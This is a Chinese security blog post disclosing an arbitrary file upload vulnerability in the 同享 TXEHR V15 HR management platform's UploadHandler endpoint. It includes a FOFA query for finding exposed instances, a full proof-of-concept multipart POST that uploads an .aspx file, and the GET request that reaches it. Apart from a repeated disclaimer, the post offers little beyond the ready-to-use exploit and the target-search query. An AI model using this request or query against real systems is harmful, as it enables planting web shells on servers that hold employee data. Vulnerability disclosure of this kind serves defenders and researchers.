> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzNzMxODkzMw==&mid=2247485936&idx=1&sn=c8db53c1a830e5151464c1c31ff2ffd7

#  同享人力管理管理平台 UploadHandler 任意文件上传漏洞  
 HK安全小屋   2025-06-13 14:06  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞。  
  
  
影响版本：  
  
同享人力管理管理平台  
  
  
FOFA:  

```
body=&#34;/Assistant/Default.aspx&#34;
```

  
  
POC：  

```
POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Length: 183
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------123
Connection: close
-----------------------------123
Content-Disposition: form-data; name=&#34;Filedata&#34;; filename=&#34;12333333.aspx&#34;
Content-Type: text/plain
safdsfsfaa
-----------------------------123--
```

  
成功上传  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI03TkiaiaNDyHzjPWeHXGxX7dL7yJHUPJCtE7Dmh3J6s9V2pN9fv4zA7r2wuZ8gLLibTVNtnK2E1g4xQ/640?wx_fmt=png&from=appmsg "")  
  
访问如下路径  

```
GET /Handler/Uploadfile2/12333333.aspx HTTP/1.1
Host: 
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI03TkiaiaNDyHzjPWeHXGxX7dV3Yd8dADg0EIzKbeLbajutT3AIaDC6qvicx1rkMInwmQL28LrWeSotw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
